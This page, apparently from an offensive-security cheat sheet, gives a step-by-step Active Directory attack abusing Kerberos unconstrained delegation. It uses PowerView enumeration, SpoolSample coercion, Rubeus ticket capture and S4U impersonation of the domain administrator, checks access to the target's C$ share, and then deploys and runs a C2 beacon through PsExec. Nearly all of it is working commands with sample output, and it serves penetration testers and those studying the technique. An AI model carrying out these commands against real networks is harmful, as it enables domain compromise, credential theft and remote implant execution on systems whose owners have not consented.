---
title: "Unconstrained Delegation"
date: 2025-8-4
tags: ["Pass-The-Ticket", "S4U", "Ticket Granting Ticket", "Unconstrained Delegation", "Active Directory", "Windows", "PsExec"]
---

### Abuse #1: Capture Ticket

{{< tab set1 tab1 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. Check TRUSTED_FOR_DELEGATION

```console
. .\PowerView.ps1
```

```console
Get-DomainComputer
```

```console {class="sample-code"}
PS C:\programdata> Get-DomainComputer
---[SNIP]---

logoncount                    : 131
badpasswordtime               : 12/31/1600 4:00:00 PM
distinguishedname             : CN=SRV002,CN=Computers,DC=Example,DC=local
objectclass                   : {top, person, organizationalPerson, user...}
badpwdcount                   : 0
displayname                   : SRV002$
lastlogontimestamp            : 11/23/2024 2:29:01 AM
objectsid                     : S-1-5-21-422340810-923920092-1608110645-1103
samaccountname                : SRV002$
localpolicyflags              : 0
codepage                      : 0
samaccounttype                : MACHINE_ACCOUNT
countrycode                   : 0
cn                            : SRV002
accountexpires                : NEVER
whenchanged                   : 11/23/2024 2:26:27 PM
instancetype                  : 4
usncreated                    : 16398
objectguid                    : e54dc358-b87f-49ad-8bcf-2029bf051006
operatingsystem               : Windows Server 2019 Standard
operatingsystemversion        : 10.0 (17763)
lastlogoff                    : 12/31/1600 4:00:00 PM
objectcategory                : CN=Computer,CN=Schema,CN=Configuration,DC=Example,DC=local
dscorepropagationdata         : {1/13/2020 5:47:08 PM, 1/13/2020 5:47:08 PM, 1/13/2020 5:47:08 PM, 1/13/2020 5:47:08 
                                PM...}
serviceprincipalname          : {TERMSRV/SRV002, TERMSRV/srv002.Example.local, WSMAN/srv002, 
                                WSMAN/srv002.Example.local...}
lastlogon                     : 11/23/2024 6:55:52 AM
iscriticalsystemobject        : False
usnchanged                    : 139420
useraccountcontrol            : WORKSTATION_TRUST_ACCOUNT, TRUSTED_FOR_DELEGATION
whencreated                   : 1/12/2020 10:24:53 AM
primarygroupid                : 515
pwdlastset                    : 3/15/2020 8:38:58 AM
msds-supportedencryptiontypes : 28
name                          : SRV002
dnshostname                   : srv002.Example.local

---[SNIP]---
```

#### 2. SpoolSample

```console
# Run multiple times
.\SpoolSample.exe <TARGET_DOMAIN> <CURRENT_DOMAIN>
```

```console {class="sample-code"}
PS C:\programdata> .\SpoolSample.exe SRV001.EXAMPLE.LOCAL SRV002.EXAMPLE.LOCAL
.\SpoolSample.exe SRV001.EXAMPLE.LOCAL SRV002.EXAMPLE.LOCAL
[+] Converted DLL to shellcode
[+] Executing RDI
[+] Calling exported function
```

<small>*Ref: [SpoolSample.exe](https://github.com/leechristensen/SpoolSample)*</small>

#### 3. Monitor Ticket Change

```console
.\rubeus.exe monitor /interval:1 /nowrap
```

```console {class="sample-code"}
PS C:\programdata> .\rubeus.exe monitor /interval:1 /nowrap
.\rubeus.exe monitor /interval:1 /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 

[*] Action: TGT Monitoring
[*] Monitoring every 1 seconds for new TGTs


[*] 11/23/2024 3:18:19 PM UTC - Found new TGT:

  User                  :  SRV001$@EXAMPLE.LOCAL
  StartTime             :  11/23/2024 2:29:32 AM
  EndTime               :  11/23/2024 12:28:56 PM
  RenewTill             :  11/30/2024 2:28:56 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :

    doIFqjCCBa ---[SNIP]--- guTE9DQUw=


[*] 11/23/2024 3:18:19 PM UTC - Found new TGT:

  User                  :  SRV002$@EXAMPLE.LOCAL
  StartTime             :  11/23/2024 2:29:01 AM
  EndTime               :  11/23/2024 12:29:01 PM
  RenewTill             :  11/30/2024 2:29:01 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFqjCCBa ---[SNIP]--- guTE9DQUw=


[*] 11/23/2024 3:18:19 PM UTC - Found new TGT:

  User                  :  SRV002$@EXAMPLE.LOCAL
  StartTime             :  11/23/2024 2:29:01 AM
  EndTime               :  11/23/2024 12:29:01 PM
  RenewTill             :  11/30/2024 2:29:01 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket   :

    doIFqjCCBa ---[SNIP]--- guTE9DQUw=

[*] Ticket cache size: 3
```

#### 4. Impersonate

```console
.\rubeus.exe s4u /impersonateuser:administrator /ticket:<BASE64_TICKET> /altservice:cifs/<TARGET_DOMAIN> /self /ptt
```

```console {class="sample-code"}
PS C:\programdata> .\rubeus.exe s4u /impersonateuser:administrator /ticket:doIFqjCCBa---[SNIP]---guTE9DQUw= /altservice:cifs/srv001.example.local /self /ptt /nowrap

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 

[*] Action: S4U

[*] Action: S4U

[*] Building S4U2self request for: 'SRV001$@example.LOCAL'
[*] Using domain controller: dc.example.local (192.168.22.10)
[*] Sending S4U2self request to 192.168.22.10:88
[+] S4U2self success!
[*] Substituting alternative service name 'cifs/srv001.example.local'
[*] Got a TGS for 'administrator' to 'cifs@example.LOCAL'
[*] base64(ticket.kirbi):

      doIGMDCCBi---[SNIP]---5sb2NhbA==

[+] Ticket successfully imported!
```

#### 5. Check

```console
dir \\<TARGET_DOMAIN>\C$
```

```console {class="sample-code"}
PS C:\programdata> dir \\srv001.example.local\C$
dir \\srv001.example.local\C$


    Directory: \\srv001.example.local\C$


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        7/24/2020   6:52 AM                PerfLogs                                                              
d-r---        7/18/2024   7:21 AM                Program Files                                                         
d-----        1/13/2020   9:46 AM                Program Files (x86)                                                   
d-r---        1/12/2020   2:28 AM                Users                                                                 
d-----        7/18/2024   4:16 PM                Windows
```

#### 6. PsExec

```console
# For Example, a C2 Beacon
cp C:\programdata\beacon.exe \\<TARGET_DOMAIN>\C$\Programdata
```

```console
.\PsExec64.exe -accepteula \\<TARGET_DOMAIN> -h 'C:\programdata\beacon.exe'
```

```console {class="sample-code"}
PS C:\programdata> .\PsExec64.exe -accepteula \\srv001.example.local -h 'C:\programdata\beacon.exe'
.\PsExec64.exe -accepteula \\srv001.example.local -h 'C:\programdata\beacon.exe'

PsExec v2.43 - Execute processes remotely
Copyright (C) 2001-2023 Mark Russinovich
Sysinternals - www.sysinternals.com

Starting C:\programdata\beacon.exe on srv001.example.local...
C:\programdata\beacon.exe exited on srv001.example.local with error code 0.
```

{{< /tabcontent >}}
